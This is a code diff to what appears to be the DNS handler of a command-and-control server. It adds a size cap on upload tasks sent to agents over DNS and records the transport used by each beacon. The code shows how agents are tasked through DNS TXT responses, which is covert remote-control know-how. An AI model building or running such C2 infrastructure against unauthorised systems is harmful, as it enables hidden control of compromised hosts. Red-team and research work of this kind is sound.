@@ -16,13 +16,14 @@ import (
 )
 
 const (
-	dnsChunkSize          = 30  // bytes per chunk before base32 encoding
-	maxDNSSessions        = 256 // cap on concurrent in-progress beacon assemblies
-	dnsSessExpiry         = 60 * time.Second
-	maxDNSBeaconBytes     = 15 * 1024
-	maxDNSChunks          = 512
-	maxDNSRequestsPerHost = 128
-	dnsRateWindow         = 10 * time.Second
+	dnsChunkSize           = 30  // bytes per chunk before base32 encoding
+	maxDNSSessions         = 256 // cap on concurrent in-progress beacon assemblies
+	dnsSessExpiry          = 60 * time.Second
+	maxDNSBeaconBytes      = 15 * 1024
+	maxDNSTaskPayloadBytes = 8 * 1024
+	maxDNSChunks           = 512
+	maxDNSRequestsPerHost  = 128
+	dnsRateWindow          = 10 * time.Second
 )
 
 // ChunkForDNS splits data into chunks suitable for DNS label encoding.
@@ -274,7 +275,7 @@ func (h *DNSHandler) ServeDNS(w mdns.ResponseWriter, r *mdns.Msg) {
 		return
 	}
 
-	h.store.UpdateInfo(beacon.AgentID, beacon.Hostname, beacon.OS, beacon.Arch)
+	h.store.UpdateInfoWithTransport(beacon.AgentID, beacon.Hostname, beacon.OS, beacon.Arch, "dns")
 	outputComplete := true
 	if beacon.TaskOutput != nil {
 		outputComplete = h.store.RecordOutput(beacon.AgentID, beacon.TaskOutput)
@@ -283,6 +284,14 @@ func (h *DNSHandler) ServeDNS(w mdns.ResponseWriter, r *mdns.Msg) {
 	var task *protocol.Task
 	if outputComplete {
 		task = h.store.DequeueTask(beacon.AgentID)
+	}
+	if taskTooLargeForDNS(task) {
+		h.store.RecordOutput(beacon.AgentID, &protocol.TaskResult{
+			TaskID: task.ID,
+			Type:   task.Type,
+			Error:  "task payload too large for DNS transport; reconnect over HTTPS and queue the upload again",
+		})
+		task = nil
 	}
 	if task == nil {
 		task = &protocol.Task{Type: "noop"}
@@ -315,6 +324,10 @@ func (h *DNSHandler) ServeDNS(w mdns.ResponseWriter, r *mdns.Msg) {
 	}
 	m.Answer = append(m.Answer, txt)
 	w.WriteMsg(m) //nolint:errcheck
+}
+
+func taskTooLargeForDNS(task *protocol.Task) bool {
+	return task != nil && task.Type == "upload" && len(task.Payload) > maxDNSTaskPayloadBytes
 }
 
 func remoteIP(addr net.Addr) string {
